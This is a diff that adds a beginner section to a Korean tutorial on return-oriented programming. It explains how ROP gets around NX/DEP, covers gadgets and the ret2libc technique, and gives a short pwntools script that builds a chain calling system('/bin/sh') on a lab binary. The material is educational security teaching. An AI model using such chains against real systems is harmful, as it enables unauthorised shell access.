@@ -6,6 +6,78 @@
 
 # ROP(Return-Oriented Programming) 체인 구성
 
+## 0. 초보자를 위한 개념 이해
+
+### ROP(Return-Oriented Programming)란?
+
+**ROP(리턴 지향 프로그래밍)**은 NX/DEP(스택 실행 방지) 보호를 우회하기 위한 공격 기법입니다. 새 코드를 삽입하는 대신 이미 실행 파일에 존재하는 코드 조각(가젯)을 재조합해 원하는 동작을 만들어냅니다.
+
+**왜 배우는가:**
+```
+NX/DEP 보호 이후의 시대:
+
+이전 (NX 없음):
+  버퍼 오버플로 → 셸코드 직접 주입 → 실행
+
+NX 도입 후:
+  셸코드 주입해도 스택/힙은 실행 불가!
+  → 공격자 해결책: "기존 코드 재활용"
+
+ROP 원리:
+  프로그램 내부 코드 조각 (Gadget):
+    "pop rdi; ret"  → rdi 레지스터에 값 설정
+    "pop rsi; ret"  → rsi 레지스터에 값 설정
+    "syscall"       → 시스템 콜 실행
+  → 조각들을 연결해 /bin/sh 실행
+```
+
+### 핵심 개념 정리
+
+```
+ROP 가젯 (Gadget):
+  ret 명령어로 끝나는 짧은 어셈블리 시퀀스
+  예: 0x401234: pop rdi; ret
+      0x401238: pop rsi; ret
+      0x40123c: syscall
+
+ROP 체인 구성:
+  스택에 가젯 주소들을 순서대로 배치
+  각 ret이 다음 가젯으로 점프
+
+ret2libc 기법:
+  system("/bin/sh") 함수 주소를 직접 호출
+  libc 라이브러리에 system()이 이미 있음
+  → "/bin/sh" 문자열 주소 + system() 주소 = 쉘!
+```
+
+### 필요한 도구
+- **pwntools**: Python 익스플로잇 개발 라이브러리
+- **ROPgadget**: 바이너리에서 가젯 자동 탐색
+- **ropper**: 가젯 탐색 + 체인 구성 도우미
+- **GDB + pwndbg**: 익스플로잇 디버깅
+
+### 기초 실습 예제
+```python
+# pwntools로 ROP 체인 구성
+from pwn import *
+
+# 바이너리 로드
+elf = ELF("./vulnerable_binary")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+# ROP 객체 생성
+rop = ROP(elf)
+
+# ret2libc 체인: system("/bin/sh") 호출
+binsh = next(libc.search(b"/bin/sh"))  # /bin/sh 문자열 주소
+rop.call(libc.sym['system'], [binsh])   # system("/bin/sh")
+
+print(f"ROP 체인: {rop.chain().hex()}")
+print(f"/bin/sh 주소: {hex(binsh)}")
+```
+
+---
+
 ## 학습 목표
 
 이 문서를 완료하면 다음을 이해하고 실습할 수 있습니다:
